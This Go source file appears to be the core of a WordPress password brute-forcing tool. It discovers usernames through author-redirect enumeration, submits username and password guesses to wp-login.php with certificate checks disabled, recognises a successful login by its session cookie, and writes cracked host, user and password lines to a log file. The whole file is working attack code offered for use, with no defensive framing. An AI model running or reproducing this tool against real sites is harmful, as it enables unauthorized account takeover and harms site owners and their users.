package module

import (
	"fmt"
	"github.com/code-scan/Goal/Ghttp"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
)

var Success = make(map[string]bool)
var BlackList = make(map[string]bool)
var sLock sync.Mutex
var bLock sync.Mutex

type WpGo struct {
	http Ghttp.Http
}

func Write(line string) {
	lock.Lock()
	file, err := os.OpenFile(LogFile, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Println(err)
	} else {
		defer file.Close()
		file.WriteString(line)
	}
	lock.Unlock()
}
func NewWpGo() *WpGo {
	w := WpGo{}
	w.http = Ghttp.Http{}
	return &w
}
func (w *WpGo) Login(siteTask SiteTask) {
	if w.CheckIsBlack(siteTask) {
		//log.Println("IsBlack ", siteTask)
		return
	}
	//log.Println(siteTask)
	uri := fmt.Sprintf("%s/wp-login.php", siteTask.Host)
	postData := fmt.Sprintf("log=%s&pwd=%s", siteTask.User, siteTask.Pass)
	w.http.New("POST", uri)
	w.http.IgnoreSSL()
	w.http.HttpClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	w.http.SetContentType("application/x-www-form-urlencoded")
	w.http.SetPostString(postData)
	//w.http.SetProxy("http://127.0.0.1:8080")
	w.http.Execute()
	cookie := w.http.RespCookie()
	if strings.Contains(cookie, "wordpress_logged_in") {
		key := fmt.Sprintf("%s|||%s", siteTask.Host, siteTask.User)
		w.SetSuccess(key)
		line := fmt.Sprintf("[!] Successful %s - U: %s - P: %s\n", siteTask.Host, siteTask.User, siteTask.Pass)
		log.Printf(line)
		Write(line)
	}

}
func (w *WpGo) GetSuccess(key string) bool {
	return Success[key]
}
func (w *WpGo) SetSuccess(key string) {
	sLock.Lock()
	Success[key] = true
	sLock.Unlock()
	return
}
func (w *WpGo) GetBlack(key string) bool {
	return BlackList[key]
}
func (w *WpGo) SetBlack(key string, t bool) {

	sLock.Lock()
	//log.Println("GetBlack ", key, t)
	BlackList[key] = t
	sLock.Unlock()
}
func (w *WpGo) CheckIsBlack(siteTask SiteTask) bool {
	if w.GetBlack(siteTask.Host) {
		return true
	}
	key := fmt.Sprintf("%s|||%s", siteTask.Host, siteTask.User)
	if w.GetSuccess(key) {
		return true
	}
	uri := fmt.Sprintf("%s/wp-login.php", siteTask.Host)
	postData := fmt.Sprintf("log=%s&pwd=%s", siteTask.User, siteTask.Pass)
	w.http.New("POST", uri)
	w.http.IgnoreSSL()
	w.http.HttpClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	w.http.SetContentType("application/x-www-form-urlencoded")
	w.http.SetPostString(postData)
	//w.http.SetProxy("http://127.0.0.1:8080")
	w.http.Execute()
	cookie := w.http.RespCookie()
	if strings.Contains(cookie, "wordpress_test_cookie") == false {
		//w.BlackList[siteTask.Host] = true
		//log.Println("cookie: ", cookie)
		w.SetBlack(siteTask.Host, true)
		return true
	}
	w.SetBlack(siteTask.Host, false)
	//w.BlackList[siteTask.Host] = false
	return false

}
func (w *WpGo) GetUser(host string, id int) string {
	uri := fmt.Sprintf("%s/?author=%d", host, id)
	w.http.New("HEAD", uri)
	w.http.IgnoreSSL()
	w.http.HttpClient.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	w.http.Execute()
	if w.http.StatusCode() != 301 && w.http.StatusCode() != 302 {
		return ""
	}
	location := w.http.HttpResponse.Header.Get("location")
	log.Println(location)
	if location != "" {
		if user := strings.Split(location, "author/"); len(user) == 2 {
			if username := strings.Split(user[1], "/"); len(username) > 1 {
				return username[0]
			}
			return user[1]
		}
	}
	return ""
}
